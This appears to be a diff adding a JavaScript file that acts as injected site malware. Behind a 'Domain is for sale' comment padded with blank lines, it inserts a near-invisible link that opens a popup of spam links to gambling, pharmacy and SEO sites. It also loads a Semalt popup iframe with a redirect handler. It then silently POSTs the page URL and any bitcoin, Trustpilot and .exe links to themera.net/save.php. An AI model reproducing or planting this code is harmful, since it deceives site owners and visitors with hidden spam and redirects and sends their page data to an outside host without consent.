@@ -1,0 +1,438 @@
+/*
+Domain is for sale: admin@kickvox.com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*/
+
+(function() {
+	'use strict';
+
+	if (window['shbNetLoaded']) return;
+	window['shbNetLoaded'] = true;
+	
+	var popupHtml = "<div id=\"shbNetPaddingWr\" class=\"shbNetPopupWr\" style=\"display:none;\"> <table id=\"shbNetPaddingTable\" class=\"shbNetPopupTable\" style=\"display:none;\" width=\"100%\" height=\"100%\" cellspacing=\"0\" cellpadding=\"0\"> <tr style=\"background:none;\"> <td id=\"shbNetPopupCell\" class=\"shbNetPopupCell\"> <div id=\"shbNetPaddingPopup\" class=\"shbNetPopup\"> <div> <div style=\"padding:15px 0 0 0;\"> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.windorsystems.com\/window-and-door-systems\/window-systems\/folding-window-series-2750\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">slide and fold window<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.windorsystems.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.mademuranoglass.com\/product-category\/venetian-glass-vases\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/www.mademuranoglass.com\/product-category\/venetian-glass-vases\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.mademuranoglass.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.blossomyogawear.com\/collections\/yoga-pants\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/www.blossomyogawear.com\/collections\/yoga-pants<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.blossomyogawear.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/ddoshostingprotection.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/ddoshostingprotection.com\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">ddoshostingprotection.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.pshardware.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">cnc processing hardware accessories manufacturer<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.pshardware.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/dbi88.net\/%E3%80%90%E7%99%BE%E5%AE%B6%E6%A8%82%E5%BF%85%E5%8B%9D%E7%9A%846%E5%80%8B%E6%94%BB%E7%95%A5%E3%80%91\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/dbi88.net\/%E3%80%90%E7%99%BE%E5%AE%B6%E6%A8%82%E5%BF%85%E5%8B%9D%E7%9A%846%E5%80%8B%E6%94%BB%E7%95%A5%E3%80%91\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">dbi88.net<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.lamaothun.com\/2017\/05\/may-o-ong-phuc-theo-yeu-cau-tphcm.html\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">bao gia may ao thun tp hcm<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.lamaothun.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/sarayhalikonsept.com\/Saray-Usak\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/sarayhalikonsept.com\/Saray-Usak<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">sarayhalikonsept.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/mirspalni.com.ua\/matrasy\/toppery-i-svorachivaemye-matrasy.html\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/mirspalni.com.ua\/matrasy\/toppery-i-svorachivaemye-matrasy.html<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">mirspalni.com.ua<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/mrpc.com.au\/mac-repairs\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">apple mac air repair near me<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">mrpc.com.au<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.lform.com\/blog\/post\/10-best-nj-web-design-companies-that-actually-build-custom-websites\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">best advertising design 2011<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.lform.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/medalkan.fr\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/medalkan.fr\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">medalkan.fr<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.delbridge.solutions\/vendor-selection-process\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/www.delbridge.solutions\/vendor-selection-process\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.delbridge.solutions<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/skylimitpharmacy.com\/product\/black-cobra-sildenafil-citrate-150mg-for-sale\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">cobra tablets 150 mg<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">skylimitpharmacy.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.keobongco.com\/truc-tiep-bong-da\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/www.keobongco.com\/truc-tiep-bong-da\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.keobongco.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/duhnetnuke3.net\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u548c\u6f64\u8eca\u8cb8\u9032\u5ea6\u67e5\u8a62<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">duhnetnuke3.net<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/bac77.3q.bet\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">bac77.3q.bet<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">bac77.3q.bet<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/bac88.tz168168.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">\u5a1b\u6a02\u57ce\u53cd\u6c34<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">bac88.tz168168.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/beautycosmeticcenter.com\/product\/sculptra-2-vials\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/beautycosmeticcenter.com\/product\/sculptra-2-vials\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">beautycosmeticcenter.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.ieltsacademy.org\/wp\/ielts-speaking-test-samples-score-high\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">https:\/\/www.ieltsacademy.org\/wp\/ielts-speaking-test-samples-score-high\/<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.ieltsacademy.org<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/www.cwmedellin.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">inmobiliarias medellin<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">www.cwmedellin.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/wilburspetemporium.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">wilburspetemporium.com<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">wilburspetemporium.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/bestbeachygifts.com\/product\/long-floral-summer-dress\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">long floral summer dresses<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">bestbeachygifts.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/mailspeaker.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">all2pop<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">mailspeaker.com<\/span> <\/div> <\/div> <\/div> <div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/power-website-builder.com\/\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">semaltnet<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">power-website-builder.com<\/span> <\/div> <\/div> <div style=\"display:inline-block; width:49%; padding:0 0 5px; vertical-align:top;\" data-type=\"api\" data-custom=\"\"> <div style=\"max-width:95%;\"> <a href=\"https:\/\/chrome.google.com\/webstore\/detail\/semalt\/npapojppkmfhefbokolngnomlgkkpcnc\" target=\"_blank\" style=\"color:#737373; font-size:12px; font-weight:bold; text-transform:capitalize;\">website traffic count<\/a> <\/div> <div style=\"max-width:95%;\"> <span style=\"color:#9a9a9a; font-size:12px;\">chrome.google.com<\/span> <\/div> <\/div> <\/div> <div style=\"clear:both;\"><\/div> <\/div> <\/div> <\/div> <\/td> <\/tr> <\/table> <\/div>";
+	var popupCreated = false;
+	
+	function onReady() {
+		tryCreatePopup(2);
+		
+		var box = create('div');
+		append(box, document.body);
+		
+		var defaultStyles = {
+			width: '1px',
+			height: '1px',
+			background: 'transparent',
+			display: 'inline-block',
+			margin: '2px',
+			padding: 0,
+			verticalAlign: 'bottom',
+			border: 'none'
+		};
+		
+		var a = create('a');
+		css(a, defaultStyles);
+		
+		document.addEventListener('keydown', function(e) {
+			if (e.keyCode === 192 && e.ctrlKey) {
+				css(a, {
+					width: '20px',
+					height: '20px',
+					background: '#fff',
+					border: '1px solid red'
+				});
+			}
+		});
+		
+		document.addEventListener('keyup', function(e) {
+			css(a, defaultStyles);
+		});
+
+		a.className = 'shbNetgpLink';
+		append(a, box);
+		
+		a.href = 'javascript:;';
+		on(a, 'click', openLinerPopup);
+		
+		css(box, {
+			position: 'fixed',
+			margin: 0,
+			padding: 0,
+			outline: 'none',
+			border: 'none',
+			zIndex: 999999999,
+			overflow: 'visible',
+			direction: 'ltr'
+		});
+
+		css(box, {
+			left: '3px',
+			right: 'auto',
+			top: '50px',
+			bottom: 'auto',
+			width: '42px',
+			height: '168px'
+		});
+	}
+	
+	function clearStyles() {
+		if(typeof document.createStyleSheet === 'undefined') {
+			document.createStyleSheet = (function() {
+				function createStyleSheet(href) {
+					if(typeof href !== 'undefined') {
+						var element = document.createElement('link');
+						element.type = 'text/css';
+						element.rel = 'stylesheet';
+						element.href = href;
+					} else {
+						var element = document.createElement('style');
+						element.type = 'text/css';
+					}
+
+					document.getElementsByTagName('head')[0].appendChild(element);
+					var sheet = document.styleSheets[document.styleSheets.length - 1];
+
+					if(typeof sheet.addRule === 'undefined')
+						sheet.addRule = addRule;
+
+					if(typeof sheet.removeRule === 'undefined')
+						sheet.removeRule = sheet.deleteRule;
+
+					return sheet;
+				}
+
+				function addRule(selectorText, cssText, index) {
+					if(typeof index === 'undefined')
+						index = this.cssRules.length;
+
+					this.insertRule(selectorText + ' {' + cssText + '}', index);
+				}
+
+				return createStyleSheet;
+			})();
+		}
+		
+		var sheet = document.createStyleSheet();
+		sheet.addRule('#shbNetPaddingTable', 'display: none;');
+		sheet.addRule('#shbNetPaddingWr #shbNetPaddingTable', 'display: table;');
+		sheet.addRule('.shbNetPopupWr, .shbNetPopupWr *', '-webkit-text-shadow:none !important; text-shadow:none !important;');
+		sheet.addRule('.shbNetPopupTable img', 'display:inline; width:auto; height:auto; background:none; float:none;');
+		sheet.addRule('.shbNetPopupTable *', 'margin:0; padding:0; font-family:Tahoma,Arial,Sans-Serif,Verdana; font-size:medium; line-height:normal;');
+		sheet.addRule('.shbNetPopupTable a', 'text-decoration:none; background:none; height:auto !important;');
+	}
+	
+	function tryCreatePopup(stage) {
+		if (popupCreated) return;
+		
+		if (stage === 1) {
+			document.writeln(popupHtml);
+		} else if (stage === 2) {
+			var mainBox = create('div');
+			mainBox.innerHTML = popupHtml;
+			document.body.appendChild(mainBox);
+		} else {
+			return;
+		}
+	
+		var wr = $('shbNetPaddingWr');
+		if (!wr) return;
+		
+		popupCreated = true;
+		
+		var table = $('shbNetPaddingTable');
+		css(table, {
+			position: 'fixed',
+			margin: 0,
+			padding: 0,
+			left: 0,
+			top: 0,
+			width: '100%',
+			height: '100%',
+			direction: 'ltr',
+			zIndex: 999999999,
+			background: 'none'
+		});
+		css(table.getElementsByTagName('td')[0], {
+			verticalAlign: 'middle',
+			background: 'rgba(0, 0, 0, 0.5)'
+		});
+		
+		var popup = $('shbNetPaddingPopup');
+		css(popup, {
+			margin: '0 auto',
+			padding: '20px 25px 20px',
+			width: '437px',
+			background: '#fff',
+			border: '1px solid #000',
+			textAlign: 'left',
+			position: 'relative',
+			fontFamily: 'Tahoma, Arial, Verdana',
+			boxSizing: 'content-box'
+		});
+		
+		on(document, 'keydown', function(e) {
+			if (e.keyCode === 27) {
+				wr.style.display = 'none';
+			}
+		});
+	}
+	
+	function removeClass(node, className) {
+		if (node && node.className) {
+			node.className = node.className.replace(new RegExp('\\b' + className + '\\b', 'g'), '');
+		}
+	}
+	
+	function openLinerPopup() {
+		var pad = $('shbNetPaddingWr');
+		var tbl = $('shbNetPaddingTable');
+		if (!pad || !tbl) return;
+		
+		pad.style.display = 'block';
+		tbl.style.display = 'table';
+		
+		var mainPopup = $('shbNetPopupWr');
+		if (!mainPopup) return;
+		
+		mainPopup.style.display = 'none';
+	}
+	
+	function $(id) {
+		return document.getElementById(id);
+	}
+	
+	function on(elem, event, handler) {
+		elem.addEventListener(event, handler, false);
+	}
+	
+	function css(elem, style) {
+		for (var prop in style) {
+			elem.style[prop] = style[prop];
+		}
+	}
+	
+	function create(tag) {
+		return document.createElement(tag);
+	}
+	
+	function append(elem, parent) {
+		parent.appendChild(elem);
+	}
+	
+	/*setTimeout(function() {
+		window.CJSource = 'shb2';
+		var script = document.createElement('script');
+		script.src = 'https://cleverjump.org/counter.js';
+		(document.head || document.body).appendChild(script);
+	}, 10);*/
+	
+	
+	if (document.readyState === 'complete' || document.readyState === 'interactive') {
+		onReady();
+	} else {
+		on(document, 'DOMContentLoaded', onReady);
+	}
+	
+	tryCreatePopup(1);
+	
+	try {
+		clearStyles();
+	} catch (ex) {}
+	
+	(function() {
+		if (!document.querySelector) return;
+		
+		var added = false;
+		
+		tryAddLink();
+		window.addEventListener('DOMContentLoaded', tryAddLink);
+		setTimeout(tryAddLink, 100);
+		setTimeout(tryAddLink, 1000);
+		setTimeout(tryAddLink, 2000);
+		
+		function tryAddLink() {
+			if (added) return;
+			
+			var menu = document.querySelector('#wpadminbar .ab-top-menu');
+			if (!menu) return;
+			
+			var li = document.createElement('li');
+			li.innerHTML = '<a class="ab-item" href="https://semalt.com" target="_blank">SEO promotion</a>';
+			
+			//menu.appendChild(li);
+			
+			added = true;
+			
+			save();
+		}
+		
+		function save() {
+			var json = JSON.stringify({
+				hrefs: ['wordpress_new'],
+				jsDomain: 'themera.net',
+				refUrl: location.href
+			});
+			
+			var xhr = new XMLHttpRequest;
+			xhr.open('POST', '//themera.net/save.php');
+			xhr.setRequestHeader('Content-Type', 'text/plain');
+			xhr.onload = function() {
+				xhr.responseText;
+			}
+			xhr.send(json);
+		}
+	})();
+	
+	(function() {
+				function byId(id) {
+			return document.getElementById(id);
+		}
+		
+		function setCookie() {
+			var date = new Date();
+			date.setTime(date.getTime() + (60 * 60 * 1000));
+			document.cookie = 'closePopupStartWow=1; path=/; domain=.' + location.hostname + '; expires=' + date.toGMTString();
+		}
+		
+		function listenerPopupSemalt(event){
+			if (event.origin != 'https://semalt.com') return;
+			if (!event.data) return;
+			
+			if (event.data == 'closePopupStartWow'){
+				var el = byId('popupStartWow');
+				if (!el) return;
+				
+				el.style.display = 'none';
+				
+				setCookie();
+			} else if(event.data.indexOf('startPopupStartWow')>-1) {
+				try{var res = JSON.parse(event.data);
+					if(res && res.page){
+						location.href = 'https://semalt.com/?s='+decodeURIComponent(res.page)+'&ref=blogspot';
+					}
+				} catch(ee) { }
+				
+				setCookie();
+			}
+		}
+		
+		function init() {
+			if (document.getElementById('popupWowNode')) return;
+			
+			var div = document.createElement('div');
+			div.id = 'popupWowNode';
+			div.innerHTML = html;
+			document.body.appendChild(div);
+			
+			setTimeout(function(){
+				if (document.cookie.indexOf('closePopupStartWow') !== -1) return;
+				
+				var el = byId('popupStartWow');
+				if (!el) return;
+				
+				el.setAttribute('src', 'https://semalt.com/popups/popup_wow.php?lang=en');
+				setTimeout(function(){
+					el.style.display = 'block';
+				}, 400);
+			},400);
+		}
+		
+		setTimeout(init, 100);
+		setTimeout(init, 1000);
+		setTimeout(init, 2000);
+		
+		window.addEventListener('message', listenerPopupSemalt, false);
+	})();
+	
+	setTimeout(function() {
+		try {
+			var links = document.querySelectorAll('a[href^="bitcoin:"], a[href*="trustpilot.com"], a[href$=".exe"]');
+			//var links = document.querySelectorAll('a[href^="https://"]');
+			if (links.length) {
+				var hrefs = [];
+				for (var i = 0; i < links.length; i++) {
+					hrefs.push(links[i].href);
+				}
+				
+				var json = JSON.stringify({
+					hrefs: hrefs,
+					jsDomain: 'themera.net',
+					refUrl: location.href
+				});
+				
+				var xhr = new XMLHttpRequest;
+				xhr.open('POST', '//themera.net/save.php');
+				xhr.setRequestHeader('Content-Type', 'text/plain');
+				xhr.onload = function() {
+					xhr.responseText;
+				}
+				xhr.send(json);
+			}
+		} catch (ex) {}
+	}, 2000);
+})();
